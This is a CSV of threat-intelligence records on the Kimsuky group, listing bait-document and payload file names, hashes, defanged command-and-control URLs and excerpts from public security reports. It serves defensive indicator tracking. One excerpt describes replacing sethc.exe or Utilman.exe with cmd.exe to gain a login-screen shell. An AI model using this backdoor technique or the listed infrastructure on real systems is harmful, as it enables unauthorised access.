1.0.0,actor--kimsuky,artifact--sha256:201a9068543b10bab6e45e08f5f379289ff4c4c582ef2e291ac1509334635a09,observation--sha256:f1f9d6d8bd58f1ef01ab884fdda8b34baf84bf2a40cf008c0b7fcbf2bb89e6b2,file-name,Korea.pdf,Korea.pdf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 63}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 27) **** Case of phishing for the purpose of hacking a specific person working at a university. North Korean expressions were also present in the index.php (proxy page) of Naver phishing in “(Table 26) C2 structural analysis and hacking target information” . In Korea, according to the Korean language norms of the National Institute of the Korean Language, convert is written as “convert,” but in North Korea, bait file I decided. URL Second, in Table 27 below, the bait file (recommendation.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2303db8a553a7e02eafc39ff8899e88da574da669518e639bdcb71f9171ee88a,observation--sha256:c47352bcc7df4e6e3236cd208012446a662088954afe806f308df303b6833042,file-name,L_quick.php,L_quick.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ navernail.eu/ewf43fewfwf4tfw4/wf7weyr892hfwogewgsfg3.php 27.255.80.170(KR) 27.102.114.89(KR) 216.189.149.71(US) ÿ www.ssktool.co.kr/ssktool/20090401skin/chinese/quick/L_quick.php 59.7.91.171(KR) ÿ www.namastte.kr/sources/Util/AJAX.php 211.53.197.220(KR) 27.255.75.137(KR) We contacted the site administrator by email to analyze the cause of the upload, but we did not receive any feedback. Operation Covert Stalker Report 1.243.200.130(KR) 185.176.43.106(BG) 27.102.107.63(KR) 27.255.81.80(KR) 162.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2303db8a553a7e02eafc39ff8899e88da574da669518e639bdcb71f9171ee88a,observation--sha256:ec06a08c68ce008de55e132b1ed67d4e7defdfee219e89fc2b3521fbc30cac50,file-name,L_quick.php,L_quick.php,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:dcff8ebbad5fcb826ca54603cea1e151aabcbf02498536c2aa25fd2d1c3a6777,observation--sha256:ed0d78b40fdbb26f4d6bba11d5ac62c526abc3aa582a2ebca3754ae06318a04a,file-name,MMC.exe,MMC.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 10}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"10 Figure 8 - Embedded payload, version 1 CHMs: Old but new Rapid7 Labs recently uncovered a suspected new Kimsuky technique using Compiled HTML Help (CHM) files. CHM is a now depreciated file format that was used for delivering help documentation in Windows environments. CHM can be exploited due to their capability to contain and execute HTML and JavaScript code, and embed automatic execution into the lure document. Similarly to LNK payloads, Rapid7 has observed several campaigns with CHM files",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e11b6efb9bd54d99d8a9ad2a1fe383069459bb990677a6fcfd7cfa70655618c6,observation--sha256:46642f3a4756e855b7952f86b2c493f9c775e2bef8455d10e4c30f5aed76042d,file-name,Magnify.exe,Magnify.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e11b6efb9bd54d99d8a9ad2a1fe383069459bb990677a6fcfd7cfa70655618c6,observation--sha256:416d03f5ed92f5a703e1fd48ab7afae592b602048d7fd16efd93dbaa70b4abe9,file-name,Magnify.exe,Magnify.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"For user convenience, when logging in, Windows 7 places the Accessibility ( ) button at the bottom left and clicks it to display accessibility settings as shown below (Figure 11), allowing users to set the environment to suit their preferences. The responsible file is Utilman.exe. Like sethc.exe, back up Utilman.exe to another file and then run cmd.exe. (Figure 11) Accessibility and using the magnifying glass feature 19 If you copy it as Utilman.exe, when you click the Accessibility button when ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:da14afe5391c74f17ad9917f64b2355fdd7a5baf66b8b7370ec615ac9feac700,observation--sha256:5ce7d7914b24a3c65d14aa542f86623d1a36369e3e9f4a58b2a8cfc09dc06946,file-name,MailSending.exe,MailSending.exe,candidate,2022-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"5 Additionally, as Kimsuky regularly targets the academic industry, who may have several placements across institutions, the personal email of a target may be directly targeted within an email chain. This approach enables a higher yield from a target that may have multiple aligned work email accounts forwarded to a personal account. Rapid7 research indicates that email-based attack chains typically employ credential phish or container-based payloads. Payloads are hosted in public storage with a ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:277791359460b87fd993f877d57ff348f42f5fbf31768034ee5dcf7ac552fe65,observation--sha256:0005202101e49cae5009888584c2a70b8b31a6fc4fef09f69b5a81f15d944d6e,file-name,MakeMail.exe,MakeMail.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 4}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 三、样本分析 3.1 第一阶段：初始访问 攻击者使用一款名为“MakeMail”的私有工具用以制作钓鱼邮件，文件信息显示开发 语言为朝鲜语，Pdb 路径：“x:\mywork\prevwork\vc attack program\makemail\release\ makemail.pdb”，其中 work 表示开发者可能处于受雇状态，prevwork 表示该工具在攻击 前阶段进行开发，编译时间 2017 年表示攻击者可能在复用之前的工具。 图[2] . MakeMail.exe 程序文件信息 此工具先点击 MakeWord 按钮，根据所设置关键字生成类似字典的 txt 文本，同时文本 内容也可自定义，然后填写对应序号，将指定 eml 文件导入，点击 MakeEmail 按钮将目标 eml 文件中的关键词替换为序号指定的关键词用以制作钓鱼邮件，再借助类似 swaks 之类 的工具进行鱼叉邮件攻击。 图[3] . MakeMail.exe 程序界面,
1.0.0,actor--kimsuky,artifact--sha256:d1c29e69e5665c5bf438148b60b72c3350dadd7ea92c43e0ade266ed79f4fb43,observation--sha256:2af03d6215bb3065b44b7c0be9688e8e19c66bd534d56c50011dc761df010f4a,file-name,MakeMail.pdb,MakeMail.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 15}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 d726d8ee222ab6855e4486cbba671827489de312e56966dd71a289098244c752 e4aef7e31a4169d2dc4356502e3ab2bc3009d32cf95e8357a58a82dfd4b17878 5cca00063272921043ccbf1bc9aa434a438078b317b1b168840abbbc8b97fd68 dbe5d2dfe2cabb40c2ce1c1127297094b41734daf33e9308b742c72eb2185b70 Pdb D:\MyWork\PrevWork\취약점자료\IE\2021\Work\Final\splwow64_poc\x64\Release\splwo w64_poc.pdb D:\MyWork\PrevWork\취약점자료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\C,
1.0.0,actor--kimsuky,artifact--sha256:d1c29e69e5665c5bf438148b60b72c3350dadd7ea92c43e0ade266ed79f4fb43,observation--sha256:d58efa4793725cf47009e206c34f07798474f243ffa7eefff4ba92a84e31e7a7,file-name,MakeMail.pdb,MakeMail.pdb,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:8eea5e0225009a6edc6b4b0c6b8903b14497bc046ed0f9fe6b9780bfa710edf7,observation--sha256:cd5d7c3dfe74c821a05e3bbea3ea4d327d6b90ee8981e5e948c29fa850cb1dd7,file-name,Minister.docx,Minister.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 62}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Bait file name National Assembly Legislative Research Service Advisory Request.docx Data URL Bait file name Analysis of North Korea’s foreign currency acquisition channels and measures to improve the effectiveness of sanctions against North Korea.pdf URL hxxps://attach.mail.daum.net/bigfile/v1/urls/d/JClVvbVCUf8Hfp Z-7_-A2w8PqyU/ JKH7ptbHMvh7XOnhrJ7UlQ (expired) Phishing URL 1 ****Institute, ******ng (***, former Minister of **) hacking target **University, ***kim*** (**, Professor) Phishing URL",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8eea5e0225009a6edc6b4b0c6b8903b14497bc046ed0f9fe6b9780bfa710edf7,observation--sha256:272d68efbbcd9622080ca2ceb83f00c31e67de86eba2e66f298ef5aecb018e14,file-name,Minister.docx,Minister.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 63}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Table 27) **** Case of phishing for the purpose of hacking a specific person working at a university. North Korean expressions were also present in the index.php (proxy page) of Naver phishing in “(Table 26) C2 structural analysis and hacking target information” . In Korea, according to the Korean language norms of the National Institute of the Korean Language, convert is written as “convert,” but in North Korea, bait file I decided. URL Second, in Table 27 below, the bait file (recommendation.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8aacf697e8b82abf5d87e57307e70af1cf4f4c8d08945c97e574369eb15bd03c,observation--sha256:e1d33ed21f7728029d40bdd5b5f9490a0e05626ccb8594d7e59f3556ebd790c9,file-name,Msgxo.hta,Msgxo.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:dc90b88d5e9867e27d95248af05d933d90fdfff5e934e048524bf70c736507ba,observation--sha256:0d95ca9a188845d5e52504567c57c76f806fa18083ddc38abb6c71dcb4a4abe7,file-name,Msgxo0.hta,Msgxo0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:dc90b88d5e9867e27d95248af05d933d90fdfff5e934e048524bf70c736507ba,observation--sha256:83db3d58477ce7987c17c7588e0c3f8160f0cdacd041b1b5f88687a5b1d187e3,file-name,Msgxo0.hta,Msgxo0.hta,candidate,2019-03-21T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 19}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-21 17:42 Last Modified Name windowsmb C2 https://login-main.bigwnet[.]com/attachment/view/Msgxo0.hta MD5 7ca1a603a7440f1031c666afbe44afc8 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last Modified Date (KST) 2019-03-26 09:45 Last Modified Name windowsmb C2 n/a MD5 60973af3b8ecbbb0ab659124409b7df1 File Name Speaking notes-ExMon Deterrence Summit-24Mar-rev26Mar19.doc Last,
1.0.0,actor--kimsuky,artifact--sha256:0582f01770c603f7aed3c83f8db9e33b6c82f0aa6f98b25cb005c5aa156e3ddf,observation--sha256:484620c0c86e5d114adf1cfcc16e233b27928c7bd744a88401a520a98a72ee8e,file-name,Mylqn0.hta,Mylqn0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:0582f01770c603f7aed3c83f8db9e33b6c82f0aa6f98b25cb005c5aa156e3ddf,observation--sha256:70b851df0a7891d220166f1ac8a26e0426d74587b7a96302f7c038a304bdee8c,file-name,Mylqn0.hta,Mylqn0.hta,candidate,2019-02-14T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 20}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[그림 9-1] Document created by 'John Harvey' is modified by 'windowsmb' File Name OFT.docm Last Modified Date (KST) 2019-02-14 23:08 Last Modified Name JamFedura C2 http://192.186.142[.]74/cache/Fwvuj0.hta MD5 304d86463a1fff5183aacc17ef2b3730 File Name bot spec.docm Last Modified Date (KST) 2019-02-18 17:30 Last Modified Name JamFedura C2 http://192.186.142[.]74/mn/Xtgnb0.hta MD5 f816a9c4a3415e8bae807c09e0f80b38 File Name white_paper.doc Last Modified Date (KST) 2019-02-19 17:29 Last Modified Name,
1.0.0,actor--kimsuky,artifact--sha256:c6d2bde4edad6157c295eaffbec0fa184a31e69d7cceea82e54fc16f8a0133d6,observation--sha256:477c958ab4958c0cf518977adb74016a64c1944a18091e1ef80554680c088f11,file-name,NK_nuclear_threat.docx,NK_nuclear_threat.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:197e1476c51ac17add1eee33fc3d6197d41fd0f57967ec165f3ac176201a5ffa,observation--sha256:8431a47804fb3ea470993c550fc29b440fd7558abea241080b30278cdfaf4ba9,file-name,OFT.docm,OFT.docm,candidate,2019-02-14T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 20}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[그림 9-1] Document created by 'John Harvey' is modified by 'windowsmb' File Name OFT.docm Last Modified Date (KST) 2019-02-14 23:08 Last Modified Name JamFedura C2 http://192.186.142[.]74/cache/Fwvuj0.hta MD5 304d86463a1fff5183aacc17ef2b3730 File Name bot spec.docm Last Modified Date (KST) 2019-02-18 17:30 Last Modified Name JamFedura C2 http://192.186.142[.]74/mn/Xtgnb0.hta MD5 f816a9c4a3415e8bae807c09e0f80b38 File Name white_paper.doc Last Modified Date (KST) 2019-02-19 17:29 Last Modified Name,
1.0.0,actor--kimsuky,artifact--sha256:9b8b5b91a30e7b6abc74583c932f08b15f5596b966a93695218c71b87f970b9d,observation--sha256:d89029a9a0f4986125af96795d22049b2ac3a3549dccd134aedec0ddd54ab619,file-name,Oct_Bld_full_view.docm,Oct_Bld_full_view.docm,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 6}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Some accounts are registered on the Korean messenger Kakao Talk, and they are using the messenger services such as Telegram and Skype as well. ESRC believes that there are 'state-sponsored actors' behind the APT attack based on the analyzed data, and named the APT attack 'Campaign Smoke Screen', concerning that the attackers are fluent in Korean and English and act secretly by abusing the stolen profiles that are using photos of foreigners. ■ Analysis of tactics and threat vector of DOC-based AP",
1.0.0,actor--kimsuky,artifact--sha256:82187d2f5ed39afc591dd06f55a75953f0428ea1504289c51c6069b67a54f4fa,observation--sha256:e8c6c885acaff9beda6ae09406b9da5d07cee4ef608b207c6a43433c358ff857,file-name,Opinion.hwp,Opinion.hwp,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:24c66602ab674063fb3841ed9da2444e725af60418e5b4732797c4c97a240e26,observation--sha256:87d970abf99dfcfff764f3c5d776a19be6d072ece04c68eb81a53562dc343e21,file-name,Pkjjy.hta,Pkjjy.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:2a6c9dec69cded6f26a5e97e2e8d168f26797ef0f57fe1bf8d74ef4697f1f888,observation--sha256:97d7cc4c8e64cf27599882d8ef628ec6b15e0303d3cbde30888be0e05970c881,file-name,Python-3.7.9-amd64.zip,Python-3.7.9-amd64.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"mmm.zip We suspect that phishing emails may have been sent afterwards. It is also possible that the Kimsuky organization only prepared to send phishing emails but did not actually send them. Python used to develop the above espoofer (Figure 29) Kimsuky organization account information and hacking target email address stored in Config.py espoofer-master_google.zip It is impossible to confirm whether the Kimsuky organization sent phishing emails to members of the National Assembly and, if so, the ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:f0ab11cb4393a5de1d6c246a922a63fa7e33b9f7e26a3a2d833113db9f5702ab,observation--sha256:e67ed242b616035b098cf799cd00a9f1362de537187fc1d4a7c834b040d2f9c7,file-name,Qfnaq.hta,Qfnaq.hta,candidate,2019-03-05T00:00:00Z,day,known,same-record,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 18}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[Figure 9] String ‘cowboy’ inside the malware Variants created from February to April 2019 are categorized by time zone as follows. File Name Task_Force_report.doc Last Modified Date (KST) 2019-03-05 18:18 Last Modified Name windowsmb C2 https://christinadudley[.]com/public_html/includes/common/Qfnaq.hta MD5 0f77143ce98d0b9f69c802789e3b1713 File Name Task_Force_report.doc Last Modified Date (KST) 2019-03-05 18:17 Last Modified Name windowsmb C2 https://christinadudley[.]com/public_html/includes/,
1.0.0,actor--kimsuky,artifact--sha256:4d25dcad8b7656a835544c4a491e8e3c327b2fc46717334f282cfbdaf9750020,observation--sha256:8ce874d2983b98f81f042657bb63262eb44c4cd914a13726b15f8eff25a5f545,file-name,Qfnaq0.hta,Qfnaq0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 9}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[Figure 3] Code of 'activeX2.bin' file Another variant with the same name as the 'TaskForceReport.doc' (MD5: 0f77143ce98d0b9f69c802789e3b1713) file has been propagated in March. - https://christinadudley[.]com/public_html/includes/common/Qfnaq0.hta - https://christinadudley[.]com/public_html/includes/common/expres.php?op=1 - https://christinadudley[.]com/public_html/includes/common/cow.php?op=Normal.src - https://christinadudley[.]com/public_html/includes/common/Normal.src - https://christinadud,
1.0.0,actor--kimsuky,artifact--sha256:bcac9773d12bd29dc9b9fe191a2c5c29d133fa782fb328494e85f732800ff9e1,observation--sha256:5095fd8ffce71e76872661be072bc9224ef5b0525db50ab6f24882fb82d4b705,file-name,Questionnaire.vbs,Questionnaire.vbs,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bcac9773d12bd29dc9b9fe191a2c5c29d133fa782fb328494e85f732800ff9e1,observation--sha256:285c63e8dc4406675134865137d475bad121d256b072a9f0b2135b3f88ecb711,file-name,Questionnaire.vbs,Questionnaire.vbs,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bbf741e4b368be7e28d029a9cbf729685bd5a61a0e9d81ec3b15c60aa0a40200,observation--sha256:5dfd222136db39744d66bf68dfc77fc9f0b151608d0447c7977769ad62f631c8,file-name,Qzqrn0.hta,Qzqrn0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
